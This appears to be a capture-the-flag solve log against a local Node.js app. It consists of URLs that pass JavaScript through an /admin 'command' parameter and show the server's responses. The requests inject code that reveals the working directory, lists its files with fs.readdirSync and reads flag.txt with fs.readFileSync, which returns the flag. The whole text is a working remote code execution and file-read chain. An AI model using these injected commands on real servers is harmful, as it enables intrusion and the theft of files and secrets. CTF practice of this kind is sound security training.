http://0.0.0.0/admin?command=new String(process.cwd())
"/home/node/app"

http://0.0.0.0/admin?command=new String(getDirectory())

http://0.0.0.0/admin?command=var fs=require("fs"); new String(fs.readdirSync("/home/node/app"))
"flag.txt,index.js,node_modules,package-lock.json,package.json,public"

http://0.0.0.0/admin?command=var fs=require("fs"); new String(fs.readFileSync("/home/node/app/flag.txt"))
"DDC{wh1tel1sts_ar3_c00l}"